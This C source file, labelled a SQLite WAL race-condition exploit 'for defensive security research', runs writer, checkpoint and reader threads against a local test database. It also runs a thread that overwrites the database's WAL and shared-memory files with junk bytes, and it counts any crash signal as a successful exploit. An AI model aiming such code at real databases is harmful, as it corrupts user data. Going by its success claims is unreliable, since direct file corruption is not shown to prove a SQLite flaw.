/*
** SQLite3 WAL Race Condition Exploit
** Target: sqlite3BtreeCheckpoint TOCTOU vulnerability (btree.c:11296)
** 
** SECURITY NOTICE: This code is for defensive security research only.
** Do not use for malicious purposes.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include "sqlite3.h"

#define WAL_RACE_DB_PATH "./inputs/wal_race.db"
#define WAL_FILE_PATH "./inputs/wal_race.db-wal"
#define SHM_FILE_PATH "./inputs/wal_race.db-shm"
#define RACE_THREADS 8
#define RACE_ITERATIONS 10000
#define CHECKPOINT_INTERVAL 100

static volatile int race_detected = 0;
static volatile int exploit_running = 1;
static pthread_barrier_t race_barrier;
static sqlite3* shared_db = NULL;

/*
** Race condition thread data
*/
typedef struct {
    int thread_id;
    int operation_type;
    int iterations;
    sqlite3* db;
} race_thread_data;

/*
** Signal handler for race condition crashes
*/
void race_crash_handler(int sig) {
    printf("[!] RACE CONDITION CRASH: Signal %d received\n", sig);
    printf("[!] WAL race condition exploitation may have succeeded\n");
    race_detected = 1;
    exploit_running = 0;
    exit(1);
}

/*
** Create WAL-enabled database for race condition testing
*/
int create_wal_race_database(const char* db_path) {
    sqlite3 *db;
    char *error_msg = 0;
    int rc;
    
    printf("[+] Creating WAL race condition test database: %s\n", db_path);
    
    system("mkdir -p ./inputs/");
    
    /* Remove existing files */
    unlink(db_path);
    unlink(WAL_FILE_PATH);
    unlink(SHM_FILE_PATH);
    
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Cannot create database: %s\n", sqlite3_errmsg(db));
        return -1;
    }
    
    /* Enable WAL mode */
    rc = sqlite3_exec(db, "PRAGMA journal_mode=WAL;", 0, 0, &error_msg);
    if (rc != SQLITE_OK) {
        printf("[-] Failed to enable WAL mode: %s\n", error_msg);
        sqlite3_free(error_msg);
        sqlite3_close(db);
        return -1;
    }
    
    /* Drop existing table if it exists and create fresh table */
    sqlite3_exec(db, "DROP TABLE IF EXISTS race_test;", 0, 0, NULL);
    
    /* Create test table */
    const char* create_sql = 
        "CREATE TABLE race_test ("
        "id INTEGER PRIMARY KEY, "
        "thread_id INTEGER, "
        "operation_count INTEGER, "
        "timestamp INTEGER, "
        "data TEXT"
        ");";
    
    rc = sqlite3_exec(db, create_sql, 0, 0, &error_msg);
    if (rc != SQLITE_OK) {
        printf("[-] Table creation failed: %s\n", error_msg);
        sqlite3_free(error_msg);
        sqlite3_close(db);
        return -1;
    }
    
    /* Insert initial data */
    for (int i = 0; i < 1000; i++) {
        char insert_sql[1024];
        snprintf(insert_sql, sizeof(insert_sql),
            "INSERT INTO race_test (thread_id, operation_count, timestamp, data) "
            "VALUES (%d, %d, %ld, 'initial_data_%d_%s');",
            i % 10, i, (long)time(NULL), i, 
            "abcdefghijklmnopqrstuvwxyz0123456789");
        
        rc = sqlite3_exec(db, insert_sql, 0, 0, &error_msg);
        if (rc != SQLITE_OK) {
            sqlite3_free(error_msg);
            break;
        }
    }
    
    sqlite3_close(db);
    printf("[+] WAL race test database created\n");
    return 0;
}

/*
** Aggressive writer thread - causes WAL file growth
*/
void* aggressive_writer_thread(void* arg) {
    race_thread_data* data = (race_thread_data*)arg;
    sqlite3* db;
    int rc;
    
    printf("[+] Writer thread %d starting\n", data->thread_id);
    
    rc = sqlite3_open(WAL_RACE_DB_PATH, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Writer thread %d: Cannot open database\n", data->thread_id);
        return NULL;
    }
    
    /* Wait for all threads to be ready */
    pthread_barrier_wait(&race_barrier);
    
    for (int i = 0; i < data->iterations && exploit_running; i++) {
        /* Rapid insertions to grow WAL file */
        char insert_sql[1024];
        snprintf(insert_sql, sizeof(insert_sql),
            "INSERT INTO race_test (thread_id, operation_count, timestamp, data) "
            "VALUES (%d, %d, %ld, 'race_data_%d_%s_%s');",
            data->thread_id, i, (long)time(NULL), i,
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
        
        char* error_msg = 0;
        rc = sqlite3_exec(db, insert_sql, 0, 0, &error_msg);
        if (rc != SQLITE_OK && error_msg) {
            sqlite3_free(error_msg);
        }
        
        /* Occasional large transactions */
        if (i % 50 == 0) {
            sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, NULL);
            for (int j = 0; j < 10; j++) {
                snprintf(insert_sql, sizeof(insert_sql),
                    "UPDATE race_test SET data = 'updated_%d_%d_%s' WHERE id = %d;",
                    data->thread_id, j, "LARGE_UPDATE_DATA_PAYLOAD", (i + j) % 1000 + 1);
                sqlite3_exec(db, insert_sql, 0, 0, NULL);
            }
            sqlite3_exec(db, "COMMIT;", 0, 0, NULL);
        }
        
        /* Small delay to allow checkpointer to interfere */
        if (i % 10 == 0) {
            usleep(1000);  /* 1ms */
        }
    }
    
    sqlite3_close(db);
    printf("[+] Writer thread %d completed\n", data->thread_id);
    return NULL;
}

/*
** Checkpoint thread - triggers race condition
*/
void* checkpoint_thread(void* arg) {
    race_thread_data* data = (race_thread_data*)arg;
    sqlite3* db;
    int rc;
    
    printf("[+] Checkpoint thread %d starting\n", data->thread_id);
    
    rc = sqlite3_open(WAL_RACE_DB_PATH, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Checkpoint thread %d: Cannot open database\n", data->thread_id);
        return NULL;
    }
    
    /* Wait for all threads to be ready */
    pthread_barrier_wait(&race_barrier);
    
    for (int i = 0; i < data->iterations && exploit_running; i++) {
        /* Different checkpoint modes to stress different code paths */
        int checkpoint_mode = i % 3;
        const char* checkpoint_sql;
        
        switch (checkpoint_mode) {
            case 0:
                checkpoint_sql = "PRAGMA wal_checkpoint;";
                break;
            case 1:
                checkpoint_sql = "PRAGMA wal_checkpoint(PASSIVE);";
                break;
            case 2:
                checkpoint_sql = "PRAGMA wal_checkpoint(FULL);";
                break;
            default:
                checkpoint_sql = "PRAGMA wal_checkpoint(RESTART);";
                break;
        }
        
        char* error_msg = 0;
        rc = sqlite3_exec(db, checkpoint_sql, 0, 0, &error_msg);
        if (rc != SQLITE_OK && error_msg) {
            printf("[+] Checkpoint %d error (expected): %s\n", i, error_msg);
            sqlite3_free(error_msg);
        }
        
        /* Aggressive checkpoint timing */
        if (i % CHECKPOINT_INTERVAL == 0) {
            printf("[+] Checkpoint thread %d: Iteration %d\n", data->thread_id, i);
            
            /* Force checkpoint with C API */
            int log_size, checkpointed;
            rc = sqlite3_wal_checkpoint_v2(db, NULL, SQLITE_CHECKPOINT_RESTART, 
                                          &log_size, &checkpointed);
            if (rc != SQLITE_OK) {
                printf("[+] WAL checkpoint_v2 result: %d\n", rc);
            }
        }
        
        /* Vary timing to hit race windows */
        if (i % 3 == 0) {
            usleep(500);   /* 0.5ms */
        } else if (i % 3 == 1) {
            usleep(2000);  /* 2ms */
        }
        /* No delay for i % 3 == 2 to create tight race */
    }
    
    sqlite3_close(db);
    printf("[+] Checkpoint thread %d completed\n", data->thread_id);
    return NULL;
}

/*
** Reader thread - adds contention during checkpoint
*/
void* reader_thread(void* arg) {
    race_thread_data* data = (race_thread_data*)arg;
    sqlite3* db;
    int rc;
    
    printf("[+] Reader thread %d starting\n", data->thread_id);
    
    rc = sqlite3_open(WAL_RACE_DB_PATH, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Reader thread %d: Cannot open database\n", data->thread_id);
        return NULL;
    }
    
    /* Wait for all threads to be ready */
    pthread_barrier_wait(&race_barrier);
    
    for (int i = 0; i < data->iterations && exploit_running; i++) {
        /* Read operations during checkpoint */
        const char* read_queries[] = {
            "SELECT COUNT(*) FROM race_test;",
            "SELECT * FROM race_test WHERE thread_id = ? LIMIT 10;",
            "SELECT MAX(id), MIN(id) FROM race_test;",
            "SELECT thread_id, COUNT(*) FROM race_test GROUP BY thread_id;"
        };
        
        sqlite3_stmt* stmt;
        const char* query = read_queries[i % 4];
        
        rc = sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
        if (rc == SQLITE_OK) {
            if (strstr(query, "?")) {
                sqlite3_bind_int(stmt, 1, data->thread_id);
            }
            
            while (sqlite3_step(stmt) == SQLITE_ROW && exploit_running) {
                /* Process results to maintain locks */
                for (int col = 0; col < sqlite3_column_count(stmt); col++) {
                    sqlite3_column_text(stmt, col);
                }
            }
            sqlite3_finalize(stmt);
        }
        
        /* Create read contention during checkpoint operations */
        usleep(100);  /* 0.1ms */
    }
    
    sqlite3_close(db);
    printf("[+] Reader thread %d completed\n", data->thread_id);
    return NULL;
}

/*
** File manipulator thread - directly manipulates WAL file during checkpoint
*/
void* file_manipulator_thread(void* arg) {
    race_thread_data* data = (race_thread_data*)arg;
    
    printf("[+] File manipulator thread %d starting\n", data->thread_id);
    
    /* Wait for all threads to be ready */
    pthread_barrier_wait(&race_barrier);
    
    for (int i = 0; i < data->iterations && exploit_running; i++) {
        /* Manipulate WAL file during checkpoint operations */
        
        /* Check if WAL file exists and get its size */
        struct stat wal_stat;
        if (stat(WAL_FILE_PATH, &wal_stat) == 0) {
            /* Try to open WAL file for manipulation */
            int wal_fd = open(WAL_FILE_PATH, O_RDWR);
            if (wal_fd >= 0) {
                /* Create TOCTOU race by modifying file during checkpoint */
                off_t file_size = wal_stat.st_size;
                if (file_size > 0) {
                    /* Seek to different positions and modify */
                    lseek(wal_fd, file_size / 2, SEEK_SET);
                    char race_data[32];
                    memset(race_data, 0xAA, sizeof(race_data));
                    write(wal_fd, race_data, sizeof(race_data));
                    
                    /* Fsync to force changes */
                    fsync(wal_fd);
                }
                close(wal_fd);
            }
        }
        
        /* Also manipulate SHM file if it exists */
        if (access(SHM_FILE_PATH, F_OK) == 0) {
            int shm_fd = open(SHM_FILE_PATH, O_RDWR);
            if (shm_fd >= 0) {
                char shm_data[64];
                memset(shm_data, 0xBB, sizeof(shm_data));
                write(shm_fd, shm_data, sizeof(shm_data));
                fsync(shm_fd);
                close(shm_fd);
            }
        }
        
        /* Timing variation for race window */
        if (i % 2 == 0) {
            usleep(1500);  /* 1.5ms */
        } else {
            usleep(300);   /* 0.3ms */
        }
    }
    
    printf("[+] File manipulator thread %d completed\n", data->thread_id);
    return NULL;
}

/*
** Execute WAL race condition exploit
*/
int execute_wal_race_exploit() {
    pthread_t threads[RACE_THREADS];
    race_thread_data thread_data[RACE_THREADS];
    
    printf("[+] Starting WAL race condition exploitation with %d threads\n", RACE_THREADS);
    
    /* Initialize barrier for thread synchronization */
    if (pthread_barrier_init(&race_barrier, NULL, RACE_THREADS) != 0) {
        printf("[-] Failed to initialize thread barrier\n");
        return -1;
    }
    
    /* Install crash handler */
    signal(SIGSEGV, race_crash_handler);
    signal(SIGABRT, race_crash_handler);
    signal(SIGBUS, race_crash_handler);
    
    /* Create race threads with different operations */
    for (int i = 0; i < RACE_THREADS; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].iterations = RACE_ITERATIONS;
        
        void* (*thread_func)(void*);
        
        if (i < 3) {
            /* Writer threads */
            thread_data[i].operation_type = 0;
            thread_func = aggressive_writer_thread;
        } else if (i < 5) {
            /* Checkpoint threads */
            thread_data[i].operation_type = 1;
            thread_func = checkpoint_thread;
        } else if (i < 7) {
            /* Reader threads */
            thread_data[i].operation_type = 2;
            thread_func = reader_thread;
        } else {
            /* File manipulator threads */
            thread_data[i].operation_type = 3;
            thread_func = file_manipulator_thread;
        }
        
        if (pthread_create(&threads[i], NULL, thread_func, &thread_data[i]) != 0) {
            printf("[-] Failed to create race thread %d\n", i);
            return -1;
        }
    }
    
    /* Wait for all threads to complete */
    for (int i = 0; i < RACE_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_barrier_destroy(&race_barrier);
    
    if (race_detected) {
        printf("[!] WAL race condition exploitation successful\n");
        return 1;
    } else {
        printf("[+] WAL race condition exploitation completed without crash\n");
        printf("[+] This could mean: race not triggered, or system protections active\n");
        return 0;
    }
}

/*
** Check for race condition indicators
*/
void check_race_condition_indicators() {
    printf("\n[+] Checking for race condition indicators...\n");
    
    /* Check for core dumps */
    if (access("core", F_OK) == 0) {
        printf("[!] Core dump detected - potential race condition crash\n");
    }
    
    /* Check WAL file integrity */
    struct stat wal_stat;
    if (stat(WAL_FILE_PATH, &wal_stat) == 0) {
        printf("[+] WAL file size: %ld bytes\n", wal_stat.st_size);
    }
    
    /* Check SHM file */
    if (access(SHM_FILE_PATH, F_OK) == 0) {
        printf("[+] SHM file exists\n");
    }
    
    /* Check database consistency */
    sqlite3* db;
    if (sqlite3_open(WAL_RACE_DB_PATH, &db) == SQLITE_OK) {
        char* error_msg = 0;
        int rc = sqlite3_exec(db, "PRAGMA integrity_check;", 0, 0, &error_msg);
        if (rc != SQLITE_OK) {
            printf("[!] Database integrity check failed: %s\n", error_msg);
            sqlite3_free(error_msg);
        } else {
            printf("[+] Database integrity check passed\n");
        }
        sqlite3_close(db);
    }
    
    printf("[+] Race condition indicator check completed\n");
}

int main(int argc, char** argv) {
    printf("=== SQLite3 WAL Race Condition Exploit ===\n");
    printf("Target: sqlite3BtreeCheckpoint TOCTOU (btree.c:11296)\n");
    printf("WARNING: For defensive security research only!\n\n");
    
    /* Create WAL-enabled test database */
    if (create_wal_race_database(WAL_RACE_DB_PATH) != 0) {
        return 1;
    }
    
    /* Execute race condition exploit */
    printf("[+] Starting WAL race condition exploitation...\n");
    int result = execute_wal_race_exploit();
    
    /* Check for race condition indicators */
    check_race_condition_indicators();
    
    printf("\n[+] WAL race condition exploit test completed\n");
    printf("[+] Result: %s\n", result ? "Race condition detected" : "No race condition detected");
    return 0;
}